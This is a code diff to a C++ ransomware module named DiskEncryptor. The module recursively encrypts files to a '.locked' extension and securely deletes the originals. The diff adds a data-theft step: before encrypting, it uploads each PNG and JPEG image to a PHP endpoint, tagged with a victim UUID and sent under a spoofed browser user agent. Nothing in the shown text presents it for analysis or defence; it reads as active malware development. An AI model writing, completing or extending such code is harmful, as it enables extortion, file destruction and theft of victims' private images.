@@ -7,6 +7,7 @@
 #include <cryptopp/files.h>
 
 #include "diskencryptor.h"
+#include "http.h"
 
 #define DEFAULT_THREADS 3
 #define FILE_EXTENSION ".locked"
@@ -35,8 +36,7 @@ bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByte
 	return true;
 }
 
-void DiskEncryptor::iterateFiles() {
-	std::cout << "Iterating files in disk: " << _disk << std::endl;
+void DiskEncryptor::iterateFiles(std::string uuid) {
 	std::vector<std::thread> threads;
 	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\mXn\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
 		try {
@@ -55,6 +55,11 @@ void DiskEncryptor::iterateFiles() {
 								t.join();
 							}
 							threads.clear();
+						}
+						if (ext == ".png" || ext == ".jpg" || ext == ".jpeg") {
+							std::string str = "uuid=" + uuid + "&ext=" + ext;
+							Http fileUploader(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
+							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: application/x-www-form-urlencoded\r\n", entry.path().wstring(), str);
 						}
 						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
 					}
@@ -84,6 +89,7 @@ bool DiskEncryptor::safeFileDeletation(std::string& file) {
 		out << 0;
 	}
 	out.close();
+	std::filesystem::remove(file);
 	return true;
 }
 
@@ -95,7 +101,6 @@ bool DiskEncryptor::fileEncrypt(std::string file) {
 	in.close();
 	out.close();
 	safeFileDeletation(file);
-	std::filesystem::remove(file);
 	return true;
 }
 
